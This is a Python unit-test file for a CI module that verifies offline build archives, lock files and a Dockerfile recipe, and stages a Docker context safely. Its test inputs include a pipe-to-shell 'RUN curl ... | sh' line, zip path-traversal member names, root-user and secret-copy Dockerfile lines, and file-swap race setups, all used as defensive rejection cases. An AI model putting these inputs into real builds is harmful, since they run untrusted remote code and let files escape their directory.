"""CI-003J offline archive input verification and candidate invariants."""
import hashlib
import os
from unittest import mock
import json
from pathlib import Path
import tempfile
import unittest
import zipfile

from scripts.ci003_builder_inputs import (
    LOCK, check_lock, check_candidate_recipe, parse_candidate_lock, verify_regular_sha256, verify_zip_archive, validate_zip_members, stage_verified_inputs,
)


class BuilderInputsTests(unittest.TestCase):
    def _zip(self, entries):
        directory = tempfile.TemporaryDirectory()
        path = Path(directory.name) / "archive.zip"
        with zipfile.ZipFile(path, "w") as z:
            for name, payload in entries:
                z.writestr(name, payload)
        self.addCleanup(directory.cleanup)
        return path

    def test_zip_metadata_valid_archive(self):
        path = self._zip([("cmdline-tools/", b""), ("cmdline-tools/bin/", b""),
                          ("cmdline-tools/bin/sdkmanager", b"tool")])
        self.assertEqual(validate_zip_members(path, "cmdline-tools/"), (3, 4))

    def test_zip_metadata_traversal_and_wrong_root_rejected(self):
        for name in ("cmdline-tools/../escape", "cmdline-tools/./escape",
                     "cmdline-tools//escape", "cmdline-tools/dir\\escape",
                     "other/file", "/cmdline-tools/file"):
            with self.subTest(name=name):
                path = self._zip([(name, b"data")])
                with self.assertRaisesRegex(ValueError, "unsafe ZIP member path"):
                    validate_zip_members(path, "cmdline-tools/")

    def test_zip_metadata_duplicate_rejected(self):
        import warnings
        with warnings.catch_warnings():
            warnings.simplefilter("ignore", UserWarning)
            path = self._zip([("gradle-8.9/a", b"one"), ("gradle-8.9/a", b"two")])
        with self.assertRaisesRegex(ValueError, "duplicate"):
            validate_zip_members(path, "gradle-8.9/")

    def test_zip_metadata_symlink_rejected(self):
        path = self._zip([("gradle-8.9/file", b"content")])
        # Reconstruct the archive with a Unix symlink mode.
        with zipfile.ZipFile(path, "w") as z:
            info = zipfile.ZipInfo("gradle-8.9/link")
            info.create_system = 3
            info.external_attr = (0o120777 << 16)
            z.writestr(info, "target")
        with self.assertRaisesRegex(ValueError, "special file or symlink"):
            validate_zip_members(path, "gradle-8.9/")

    def test_zip_metadata_file_directory_collision_rejected(self):
        path = self._zip([("gradle-8.9/a", b"x"), ("gradle-8.9/a/b", b"y")])
        with self.assertRaisesRegex(ValueError, "nested under a file"):
            validate_zip_members(path, "gradle-8.9/")
        path = self._zip([("gradle-8.9/a/b", b"y"), ("gradle-8.9/a", b"x")])
        with self.assertRaisesRegex(ValueError, "shadows directory"):
            validate_zip_members(path, "gradle-8.9/")

    def test_zip_metadata_limits_and_invalid_archive(self):
        path = self._zip([("gradle-8.9/a", b"123456")])
        with self.assertRaisesRegex(ValueError, "expansion limit|expanded data"):
            validate_zip_members(path, "gradle-8.9/", max_expanded=5)
        with self.assertRaisesRegex(ValueError, "member count"):
            validate_zip_members(path, "gradle-8.9/", max_members=0)
        with tempfile.TemporaryDirectory() as d:
            invalid = Path(d) / "bad.zip"
            invalid.write_bytes(b"not a zip")
            with self.assertRaisesRegex(ValueError, "invalid ZIP archive"):
                validate_zip_members(invalid, "gradle-8.9/")

    def test_inode_bound_zip_rejects_path_replacement_and_inspects_original(self):
        original = self._zip([("gradle-8.9/", b""), ("gradle-8.9/bin/tool", b"safe")])
        expected = hashlib.sha256(original.read_bytes()).hexdigest()
        replacement = self._zip([("evil/file", b"bad")])
        moved = original.with_name("original-moved.zip")
        actual_validator = validate_zip_members

        inspected = []

        def swap_path(verified_stream, prefix):
            # A rename may change ctime, so fail closed even though the
            # descriptor continues to reference the original ZIP contents.
            os.replace(original, moved)
            original.write_bytes(replacement.read_bytes())
            inspected.append(actual_validator(verified_stream, prefix))
            return inspected[-1]

        with mock.patch("scripts.ci003_builder_inputs.validate_zip_members",
                        side_effect=swap_path):
            with self.assertRaisesRegex(ValueError, "changed during ZIP inspection"):
                verify_zip_archive(original, expected, "gradle-8.9/")
        self.assertEqual(inspected, [(2, 4)])

    def test_inode_bound_zip_detects_in_place_mutation(self):
        path = self._zip([("gradle-8.9/", b""), ("gradle-8.9/a", b"ok")])
        expected = hashlib.sha256(path.read_bytes()).hexdigest()
        actual_validator = validate_zip_members

        def mutate_inode(stream, prefix):
            result = actual_validator(stream, prefix)
            with path.open("ab") as writer:
                writer.write(b"changed")
            return result

        with mock.patch("scripts.ci003_builder_inputs.validate_zip_members",
                        side_effect=mutate_inode):
            with self.assertRaisesRegex(ValueError, "changed during ZIP inspection"):
                verify_zip_archive(path, expected, "gradle-8.9/")

    def test_inode_bound_zip_rejects_invalid_digest_and_symlink(self):
        path = self._zip([("gradle-8.9/a", b"ok")])
        with self.assertRaisesRegex(ValueError, "SHA-256 mismatch"):
            verify_zip_archive(path, "0" * 64, "gradle-8.9/")
        link = path.with_name("archive-link.zip")
        link.symlink_to(path)
        self.addCleanup(link.unlink)
        with self.assertRaisesRegex(ValueError, "safely open"):
            verify_zip_archive(link, hashlib.sha256(path.read_bytes()).hexdigest(),
                               "gradle-8.9/")

    def test_valid_small_regular_file(self):
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "sample.zip"
            path.write_bytes(b"test payload")
            self.assertEqual(verify_regular_sha256(path, hashlib.sha256(b"test payload").hexdigest()), 12)

    def test_modified_content_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "sample.zip"
            path.write_bytes(b"tampered")
            with self.assertRaisesRegex(ValueError, "mismatch"):
                verify_regular_sha256(path, hashlib.sha256(b"expected").hexdigest())

    def test_symlink_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "sample.zip"
            path.write_bytes(b"abc")
            link = Path(d) / "link.zip"
            link.symlink_to(path)
            with self.assertRaisesRegex(ValueError, "safely open"):
                verify_regular_sha256(link, hashlib.sha256(b"abc").hexdigest())

    def test_directory_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            with self.assertRaisesRegex(ValueError, "regular"):
                verify_regular_sha256(Path(d), hashlib.sha256(b"abc").hexdigest())

    def test_oversized_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "sample.zip"
            path.write_bytes(b"abc")
            with self.assertRaisesRegex(ValueError, "bounded"):
                verify_regular_sha256(path, hashlib.sha256(b"abc").hexdigest(), maximum=2)

    def test_empty_rejected(self):
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "sample.zip"
            path.touch()
            with self.assertRaisesRegex(ValueError, "bounded"):
                verify_regular_sha256(path, hashlib.sha256(b"").hexdigest())

    def test_invalid_hash_rejected(self):
        with self.assertRaisesRegex(ValueError, "expected SHA"):
            verify_regular_sha256(Path("/missing"), "abc")

    def test_locked_candidate_schema(self):
        lock = check_lock(json.loads(LOCK.read_text(encoding="utf-8")))
        self.assertEqual(lock["status"], "UNAPPROVED_CANDIDATE")

    def test_mutable_base_rejected(self):
        lock = json.loads(LOCK.read_text(encoding="utf-8"))
        lock["python_base"] = "docker.io/library/python:3.11"
        with self.assertRaisesRegex(ValueError, "digest-pinned"):
            check_lock(lock)

    def test_unknown_lock_key_rejected(self):
        lock = json.loads(LOCK.read_text(encoding="utf-8"))
        lock["allow_root"] = True
        with self.assertRaisesRegex(ValueError, "schema"):
            check_lock(lock)

    def test_malformed_archive_manifest_rejected_without_exception_leak(self):
        lock = parse_candidate_lock(LOCK.read_text(encoding="utf-8"))
        for malformed in (list(lock["archives"]), None, "not-a-map", 7):
            with self.subTest(malformed=repr(malformed)):
                with self.assertRaisesRegex(ValueError, "invalid archive manifest"):
                    check_lock(dict(lock, archives=malformed))

    def test_duplicate_root_lock_key_rejected(self):
        raw = LOCK.read_text(encoding="utf-8").replace('"schema_version": 1,', '"schema_version": 1, "schema_version": 1,')
        with self.assertRaisesRegex(ValueError, "duplicate"):
            parse_candidate_lock(raw)

    def test_duplicate_nested_archive_key_rejected(self):
        raw = LOCK.read_text(encoding="utf-8")
        name = '"gradle-8.9-bin.zip"'
        raw = raw.replace(name, name + ': "' + 'a' * 64 + '", ' + name, 1)
        with self.assertRaisesRegex(ValueError, "duplicate"):
            parse_candidate_lock(raw)

    def test_recipe_matches_locked_candidate(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        self.assertTrue(check_candidate_recipe(lock, recipe))

    def test_recipe_rejects_mutable_base(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        recipe = recipe.replace(lock["python_base"], "docker.io/library/python:3.11")
        with self.assertRaisesRegex(ValueError, "base image mismatch"):
            check_candidate_recipe(lock, recipe)

    def test_recipe_rejects_duplicate_from(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        with self.assertRaisesRegex(ValueError, "base image mismatch"):
            check_candidate_recipe(lock, recipe + "\nFROM alpine:latest\n")

    def test_recipe_rejects_tab_and_case_bypass(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        with self.assertRaisesRegex(ValueError, "base image mismatch"):
            check_candidate_recipe(lock, recipe + "\nFROM\talpine:latest\n")
        with self.assertRaisesRegex(ValueError, "non-root runtime"):
            check_candidate_recipe(lock, recipe + "\nuser\troot\n")
        with self.assertRaisesRegex(ValueError, "COPY scope mismatch"):
            check_candidate_recipe(lock, recipe + "\ncopy\t. /tmp/leak\n")

    def test_recipe_rejects_wrong_archive_checksum(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        recipe = recipe.replace(lock["archives"]["gradle-8.9-bin.zip"], 'a' * 64)
        with self.assertRaisesRegex(ValueError, "RUN declarations mismatch"):
            check_candidate_recipe(lock, recipe)

    def test_recipe_rejects_extra_copy_and_root(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        with self.assertRaisesRegex(ValueError, "COPY scope mismatch"):
            check_candidate_recipe(lock, recipe + "\nCOPY . /secrets\n")
        with self.assertRaisesRegex(ValueError, "non-root runtime"):
            check_candidate_recipe(lock, recipe + "\nUSER root\n")

    def test_recipe_rejects_network_install_and_add(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        with self.assertRaisesRegex(ValueError, "RUN declarations mismatch"):
            check_candidate_recipe(lock, recipe + "\nRUN curl https://example.com/x | sh\n")
        with self.assertRaisesRegex(ValueError, "unexpected instruction"):
            check_candidate_recipe(lock, recipe + "\nADD https://example.com/x /tmp/x\n")

    def test_recipe_rejects_heredoc_payload_injection(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        tampered = recipe.replace("import pathlib, zipfile, os", "import pathlib, zipfile, os\nprint('UNAPPROVED_PAYLOAD')")
        with self.assertRaisesRegex(ValueError, "recipe SHA-256 mismatch"):
            check_candidate_recipe(lock, tampered)

    def test_recipe_rejects_extra_env_and_undeclared_instructions(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        for payload in ("ENV PATH=/tmp/unsafe\n", "HEALTHCHECK NONE\n", "LABEL reviewer=approved\n"):
            with self.subTest(payload=payload), self.assertRaisesRegex(ValueError, "recipe SHA-256 mismatch"):
                check_candidate_recipe(lock, recipe + payload)

    def test_recipe_rejects_comment_and_line_continuation_changes(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        for payload in ("# attacker comment\n", chr(92) + "\n"):
            with self.subTest(payload=payload), self.assertRaisesRegex(ValueError, "recipe SHA-256 mismatch"):
                check_candidate_recipe(lock, recipe + payload)

    def test_recipe_lock_digest_invalid_or_missing(self):
        lock = parse_candidate_lock(LOCK.read_text(encoding="utf-8"))
        for value in ("xyz", None, "A" * 64):
            candidate = dict(lock, recipe_sha256=value)
            with self.subTest(value=value), self.assertRaisesRegex(ValueError, "recipe SHA-256"):
                check_lock(candidate)
        del lock["recipe_sha256"]
        with self.assertRaisesRegex(ValueError, "schema"):
            check_lock(lock)

    def test_recipe_rejects_newline_encoding_change(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        raw = (LOCK.parent / "Dockerfile.candidate").read_bytes()
        # A different byte representation must not be accepted as identical.
        with self.assertRaisesRegex(ValueError, "recipe SHA-256 mismatch"):
            check_candidate_recipe(lock, raw.decode("utf-8").replace("\n", "\r\n"))

    def test_recipe_lock_digest_mismatch_rejected(self):
        lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        recipe = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        tampered_lock = dict(lock, recipe_sha256="0" * 64)
        with self.assertRaisesRegex(ValueError, "recipe SHA-256 mismatch"):
            check_candidate_recipe(tampered_lock, recipe)

    def test_build_context_excludes_repository_files(self):
        rules = (LOCK.parent / "Dockerfile.candidate.dockerignore").read_text().splitlines()
        self.assertEqual(rules[0], "**")
        self.assertEqual(set(rules[1:]), {
            "!builder/", "!builder/inputs/",
            "!builder/inputs/commandlinetools-linux-16111833_latest.zip",
            "!builder/inputs/gradle-8.9-bin.zip",
        })

    def test_dockerfile_matches_lock(self):
        lock = check_lock(json.loads(LOCK.read_text(encoding="utf-8")))
        text = (LOCK.parent / "Dockerfile.candidate").read_text(encoding="utf-8")
        for key in ("python_base", "jdk_base"):
            self.assertIn(lock[key], text)
        for sha in lock["archives"].values():
            self.assertIn(sha, text)
        self.assertIn("USER 10001:10001", text)
        self.assertNotIn("apt-get", text)
        self.assertNotIn("sdkmanager --licenses", text)
        self.assertNotIn("RUN curl", text)



class VerifiedContextStagingTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name)
        self.source = self.root / "source"
        self.source.mkdir()
        self.stage = self.root / "inputs"
        self.lock = check_lock(parse_candidate_lock(LOCK.read_text(encoding="utf-8")))
        self.lock = dict(self.lock)
        self.lock["archives"] = {}
        for name, prefix in (
            ("commandlinetools-linux-16111833_latest.zip", "cmdline-tools/"),
            ("gradle-8.9-bin.zip", "gradle-8.9/"),
        ):
            with zipfile.ZipFile(self.source / name, "w") as z:
                z.writestr(prefix + "bin/tool", b"synthetic fixture")
            self.lock["archives"][name] = hashlib.sha256((self.source / name).read_bytes()).hexdigest()

    def test_stages_two_verified_archives_without_modifying_sources(self):
        self.assertTrue(stage_verified_inputs(self.source, self.stage, self.lock))
        for name, digest in self.lock["archives"].items():
            self.assertEqual(hashlib.sha256((self.stage / name).read_bytes()).hexdigest(), digest)
            self.assertEqual((self.stage / name).stat().st_mode & 0o777, 0o400)
            self.assertEqual((self.source / name).stat().st_mode & 0o777, 0o644)
        self.assertEqual(self.stage.stat().st_mode & 0o777, 0o700)

    def test_refuses_overwrite_even_if_existing_stage_matches(self):
        stage_verified_inputs(self.source, self.stage, self.lock)
        with self.assertRaisesRegex(ValueError, "already exists"):
            stage_verified_inputs(self.source, self.stage, self.lock)

    def test_rejects_symlink_source_directory(self):
        link = self.root / "link"
        link.symlink_to(self.source, target_is_directory=True)
        with self.assertRaisesRegex(ValueError, "unsafe source directory"):
            stage_verified_inputs(link, self.stage, self.lock)
        self.assertFalse(self.stage.exists())

    def test_rejects_modified_source_digest_before_publication(self):
        name = "gradle-8.9-bin.zip"
        with open(self.source / name, "ab") as f:
            f.write(b"tampered")
        with self.assertRaisesRegex(ValueError, "SHA-256 mismatch"):
            stage_verified_inputs(self.source, self.stage, self.lock)
        self.assertFalse((self.stage / name).exists())

    def test_failed_second_archive_cleans_partial_context_and_allows_retry(self):
        name = "gradle-8.9-bin.zip"
        original = (self.source / name).read_bytes()
        (self.source / name).write_bytes(b"corrupt" + original)
        with self.assertRaisesRegex(ValueError, "SHA-256 mismatch"):
            stage_verified_inputs(self.source, self.stage, self.lock)
        self.assertFalse(self.stage.exists(), "partial Docker context must not survive")
        (self.source / name).write_bytes(original)
        self.assertTrue(stage_verified_inputs(self.source, self.stage, self.lock))

    def test_missing_second_archive_cleans_partial_context(self):
        (self.source / "gradle-8.9-bin.zip").unlink()
        with self.assertRaises(FileNotFoundError):
            stage_verified_inputs(self.source, self.stage, self.lock)
        self.assertFalse(self.stage.exists())

    def test_failed_staging_does_not_delete_unexpected_entries(self):
        from scripts import ci003_builder_inputs as impl
        def inject_unexpected(fd, expected, maximum):
            (self.stage / "foreign.txt").write_text("leave intact")
            raise ValueError("injected verification failure")
        with mock.patch.object(impl, "_verify_open_sha256", side_effect=inject_unexpected):
            with self.assertRaisesRegex(ValueError, "injected verification failure"):
                stage_verified_inputs(self.source, self.stage, self.lock)
        self.assertEqual((self.stage / "foreign.txt").read_text(), "leave intact")

    def test_stage_open_failure_cleans_only_owned_empty_context(self):
        from scripts import ci003_builder_inputs as impl
        original_open = impl.os.open

        def fail_stage_open(path, flags, *args, **kwargs):
            if path == self.stage.name and kwargs.get("dir_fd") is not None:
                raise OSError("synthetic stage directory open failure")
            return original_open(path, flags, *args, **kwargs)

        with mock.patch.object(impl.os, "open", side_effect=fail_stage_open):
            with self.assertRaisesRegex(ValueError, "cannot safely open staged directory"):
                stage_verified_inputs(self.source, self.stage, self.lock)
        self.assertFalse(self.stage.exists(), "failed open must not strand a context")

    def test_rejects_stage_directory_substitution_before_open(self):
        from scripts import ci003_builder_inputs as impl
        original_open = impl.os.open
        original_stage = self.root / "original-stage"
        swapped = [False]

        def swap_before_open(path, flags, *args, **kwargs):
            if (path == self.stage.name and kwargs.get("dir_fd") is not None
                    and not swapped[0]):
                swapped[0] = True
                self.stage.rename(original_stage)
                self.stage.mkdir(mode=0o700)
            return original_open(path, flags, *args, **kwargs)

        with mock.patch.object(impl.os, "open", side_effect=swap_before_open):
            with self.assertRaisesRegex(ValueError, "substituted before opening"):
                stage_verified_inputs(self.source, self.stage, self.lock)
        self.assertTrue(swapped[0])
        self.assertTrue(original_stage.is_dir())
        self.assertTrue(self.stage.is_dir(), "do not delete a substituted directory")
        self.assertEqual(list(self.stage.iterdir()), [])

    def test_rejects_symlink_staging_destination(self):
        link = self.root / "inputs"
        link.symlink_to(self.source, target_is_directory=True)
        with self.assertRaisesRegex(ValueError, "already exists"):
            stage_verified_inputs(self.source, link, self.lock)
        self.assertEqual(len(list(self.source.iterdir())), 2)

    def test_rejects_in_place_source_mutation_after_first_digest(self):
        from scripts import ci003_builder_inputs as impl
        actual = impl._verify_open_sha256
        triggered = [False]

        def mutate(fd, expected, maximum):
            result = actual(fd, expected, maximum)
            if not triggered[0]:
                triggered[0] = True
                name = "commandlinetools-linux-16111833_latest.zip"
                with open(self.source / name, "ab") as stream:
                    stream.write(b"after-hash mutation")
            return result

        with mock.patch.object(impl, "_verify_open_sha256", side_effect=mutate):
            with self.assertRaisesRegex(ValueError, "source changed|SHA-256 mismatch"):
                stage_verified_inputs(self.source, self.stage, self.lock)
        self.assertTrue(triggered[0])

    def test_rejects_symlinked_intermediate_stage_ancestor(self):
        actual = self.root / "actual"
        actual.mkdir()
        alias = self.root / "alias"
        alias.symlink_to(actual, target_is_directory=True)
        with self.assertRaisesRegex(ValueError, "unsafe stage ancestor"):
            stage_verified_inputs(self.source, alias / "inputs", self.lock)
        self.assertFalse((actual / "inputs").exists())

    def test_rejects_writable_intermediate_stage_ancestor(self):
        shared = self.root / "shared"
        parent = shared / "private"
        parent.mkdir(parents=True)
        shared.chmod(0o770)
        with self.assertRaisesRegex(ValueError, "writable stage ancestor"):
            stage_verified_inputs(self.source, parent / "inputs", self.lock)
        self.assertFalse((parent / "inputs").exists())
        self.assertEqual(shared.stat().st_mode & 0o777, 0o770)

    def test_rejects_relative_stage_parent(self):
        with self.assertRaisesRegex(ValueError, "absolute non-traversing"):
            stage_verified_inputs(self.source, Path("relative") / "inputs", self.lock)


    def test_rejects_world_writable_destination_parent(self):
        unsafe = self.root / "unsafe"
        unsafe.mkdir(mode=0o777)
        unsafe.chmod(0o777)
        with self.assertRaisesRegex(ValueError, "group/other writable"):
            stage_verified_inputs(self.source, unsafe / "inputs", self.lock)
        self.assertFalse((unsafe / "inputs").exists())


if __name__ == "__main__":
    unittest.main()
